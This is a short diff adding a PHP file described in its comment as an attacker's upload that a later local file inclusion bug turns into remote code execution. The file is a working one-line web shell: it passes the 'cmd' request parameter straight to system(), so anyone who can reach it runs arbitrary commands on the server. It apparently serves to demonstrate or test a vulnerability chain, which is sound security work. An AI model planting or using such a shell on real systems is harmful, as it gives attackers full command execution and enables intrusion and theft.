@@ -1,0 +1,10 @@
+<?php
+
+/*Example of a file uploaded by the attacker in a upload function before that wasen't exploitable by itself. 
+* A later LFI (this vulnerability) was discovered and made it possible to chain them togther to get an RCE!
+*/
+
+echo "Exploited!";
+echo system($_GET['cmd']);
+
+?>
